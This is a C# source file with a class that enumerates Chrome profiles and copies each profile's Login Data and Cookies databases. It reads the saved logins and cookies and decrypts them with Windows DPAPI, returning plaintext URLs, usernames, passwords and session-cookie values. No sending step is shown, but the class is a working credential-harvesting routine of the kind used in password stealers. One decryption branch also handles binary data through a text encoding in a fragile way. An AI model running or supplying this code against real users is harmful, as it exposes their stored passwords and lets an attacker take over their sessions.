//#define USE_System_Data_Sqlite

using System;
#if USE_System_Data_Sqlite
using System.Data.SQLite;
#endif
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Diagnostics;
using System.Data.SQLite;

namespace dao
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class BaseChrome
    {
#if USE_System_Data_Sqlite
        public IEnumerable<PassModel> Reads(String profileName, String logindataPath)
        {
            var result = new List<PassModel>();
            if (File.Exists(logindataPath))
            {
                String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string target = APPDATA_PATH + @"\tempc";
                if (File.Exists(target))
                    File.Delete(target);
                File.Copy(logindataPath, target);
                using (var conn = new SQLiteConnection($"Data Source={target};"))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    try
                                    {
                                        String pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
                                        String url = reader.GetString(0);
                                        String user = reader.GetString(1);
                                        if (!String.IsNullOrWhiteSpace(url) && !String.IsNullOrWhiteSpace(user))
                                        {
                                            result.Add(new PassModel()
                                            {
                                                Url = url,
                                                Profile = profileName,
                                                Username = user,
                                                Password = pass
                                            });
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
                                    }
                                }
                            }
                        }
                    }
                    conn.Close();
                }
                if (File.Exists(target))
                    File.Delete(target);
            }
            return result;
        }
        
        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }
#else
        public IEnumerable<PassModel> Reads(string profileName, string logindataPath)
        {
            var result = new List<PassModel>();
            if (File.Exists(logindataPath))
            {
                String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string target = APPDATA_PATH + @"\tempc";
                if (File.Exists(target))
                    File.Delete(target);
                File.Copy(logindataPath, target);
                SQLiteHandler SQLDatabase = new SQLiteHandler(target);
                if (SQLDatabase.ReadTable("logins"))
                {
                    int totalEntries = SQLDatabase.GetRowCount();
                    for (int i = 0; i < totalEntries; i++)
                    {
                        try
                        {
                            String url = SQLDatabase.GetValue(i, "origin_url");
                            String user = SQLDatabase.GetValue(i, "username_value");
                            String pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));
                            if (!String.IsNullOrEmpty(url) && !String.IsNullOrEmpty(user))
                            {
                                result.Add(new PassModel()
                                {
                                    Url = url,
                                    Profile = profileName,
                                    Username = user,
                                    Password = pass
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
                        }
                    }
                }
                if (File.Exists(target))
                    File.Delete(target);
            }
            return result;
        }

        private static string Decrypt(string EncryptedData)
        {
            if (EncryptedData == null || EncryptedData.Length == 0)
            {
                return null;
            }
            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decryptedData);
        }
#endif

        public IEnumerable<PassModel> Reads(String basePath)
        {
            var result = new List<PassModel>();
            try
            {
                List<String> profileList = new List<string>();
                profileList.Add("Default");
                DirectoryInfo dInfo = new DirectoryInfo(basePath);
                DirectoryInfo[] dInfoArray = dInfo.GetDirectories("Profile *", SearchOption.TopDirectoryOnly);
                foreach (DirectoryInfo d in dInfoArray)
                {
                    profileList.Add(d.Name);
                }

                foreach (String profileName in profileList)
                {
                    String profilePath = $"{basePath}\\{profileName}\\Login Data";
                    result.AddRange(Reads(profileName, profilePath));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed : {basePath} : " + ex.Message);
            }
            return result;
        }

        public IEnumerable<Cookie> ReadsCookieFile(String profileName, String cookiePath, String host)
        {
            var result = new List<Cookie>();
            if (File.Exists(cookiePath))
            {
                try
                {
                    String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    string target = APPDATA_PATH + @"\tempc";
                    if (File.Exists(target))
                        File.Delete(target);
                    File.Copy(cookiePath, target);
                    using (var conn = new SQLiteConnection($"Data Source={target};pooling=false"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            if (host == null)
                            {
                                cmd.CommandText = "SELECT host_key,name,encrypted_value FROM cookies";
                            }
                            else
                            {
                                var prm = cmd.CreateParameter();
                                prm.ParameterName = "hostName";
                                prm.Value = host;
                                cmd.Parameters.Add(prm);
                                cmd.CommandText = "SELECT host_key,name,encrypted_value FROM cookies WHERE host_key = @hostName";
                            }
                            using (var reader = cmd.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    while (reader.Read())
                                    {
                                        try
                                        {
                                            var encryptedData = (byte[])reader[2];
                                            var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                                            var plainText = Encoding.ASCII.GetString(decodedData); // Looks like ASCII
                                            result.Add(new Cookie()
                                            {
                                                Profile = profileName,
                                                Url = reader.GetString(0),
                                                Name = reader.GetString(1),
                                                Value = plainText
                                            });
                                        }
                                        catch (Exception ex)
                                        {
                                            Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
                                        }
                                    }
                                }
                            }
                        }
                        conn.Close();
                    }
                    if (File.Exists(target))
                        File.Delete(target);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
                }
            }
            return result;
        }

        public IEnumerable<Cookie> ReadsCookie(String basePath, String host, String filename = "Cookies")
        {
            var result = new List<Cookie>();
            try
            {
                List<String> profileList = new List<string>();
                profileList.Add("Default");
                DirectoryInfo dInfo = new DirectoryInfo(basePath);
                DirectoryInfo[] dInfoArray = dInfo.GetDirectories("Profile *", SearchOption.TopDirectoryOnly);
                foreach (DirectoryInfo d in dInfoArray)
                {
                    profileList.Add(d.Name);
                }
                foreach (String profileName in profileList)
                {
                    String profilePath = $"{basePath}\\{profileName}\\{filename}";
                    result.AddRange(ReadsCookieFile(profileName, profilePath, host));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed : {basePath} : " + ex.Message);
            }
            return result;
        }

    }

}
